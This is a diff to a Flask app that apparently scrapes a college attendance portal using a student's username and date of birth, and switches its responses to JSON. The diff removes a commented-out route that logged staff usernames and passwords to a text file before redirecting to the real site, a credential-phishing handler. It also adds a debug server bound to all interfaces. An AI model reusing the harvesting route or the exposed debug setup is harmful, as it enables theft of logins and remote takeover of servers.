@@ -1,4 +1,4 @@
-from flask import Flask, render_template, url_for, redirect, request, flash, send_from_directory,session
+from flask import Flask, render_template, url_for, redirect, request, flash, send_from_directory, session, jsonify
 import requests
 from requests import adapters
 import ssl
@@ -24,16 +24,7 @@ def home():
 def check_another():
     session.clear()
     return redirect(url_for('home'))
-# @app.route('/staff/attendance',  methods=['POST', 'GET'])
-# def staff_attendance():
-#     if request.method == 'POST':
-#         user = request.form['username']
-#         pas = request.form['DOB']
-#         with open('static/user_data.txt', 'a') as file:
-#             file.write(f'Username: {user}, Password: {pas}\n')
-#         return redirect('https://mgc.ibossems.com/')
-#     elif request.method == 'GET':
-#         redirect(url_for('staff')) 
+
 
 @app.route('/result', methods=['POST', 'GET'])
 def result():
@@ -60,8 +51,7 @@ def result():
             original_date = datetime.strptime(pas, "%Y-%m-%d")
             formatted_date = original_date.strftime("%y-%m-%d")
         except ValueError:
-            flash('Please select DOB')
-            return redirect(url_for('home'))
+            return jsonify({'error': 'Please select DOB'})
         form_url = 'https://mgc.ibossems.com/'
         result_url = 'https://mgc.ibossems.com/student/'
         list_url = 'https://mgc.ibossems.com/student/attendance/list'
@@ -89,8 +79,7 @@ def result():
         error = re.findall(r'<p[^>]*>(.*?)</p>', response2.text)
         
         if error:
-                flash(error[0])
-                return redirect(url_for('home'))
+            return jsonify({'error': error[0]})
         
         if response2.status_code == 200:
             response3 = req_session.get(details_url, headers=lis_headers)
@@ -152,8 +141,18 @@ def result():
             end_time = time.time()
             elapsed_time = end_time - start_time
             print(elapsed_time)
-        return render_template('result.html', name=student_name, att=att_percent, att_details = send,attendance_percentage=attendance_percentage,
-                    semester=sem,year=year,dept=dept, attendance_data=attendance_data, total_days=total_day,tot_abs = tot_absent)
+        return jsonify({
+            'name': student_name,
+            'att': att_percent,
+            'att_details': send,
+            'attendance_percentage': attendance_percentage,
+            'semester': sem,
+            'year': year,
+            'dept': dept,
+            'attendance_data': attendance_data,
+            'total_days': total_day,
+            'tot_abs': tot_absent
+        })
     elif request.method == 'GET':
         if 'username' in session and 'password' in session:
             user = session['username'] 
@@ -164,13 +163,13 @@ def result():
             # Redirect to home if no stored credentials
             return redirect(url_for('home'))
 
-@app.route('/ads.txt')
-def serve_ads_txt():
-     return send_from_directory(app.static_folder, 'ads.txt')
+@app.route('/favicon.ico')
+def favicon():
+    return send_from_directory('static', 'favicon.ico')
 
 @app.route('/health')
 def health():
     return 'ok'
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=5000, debug=True)
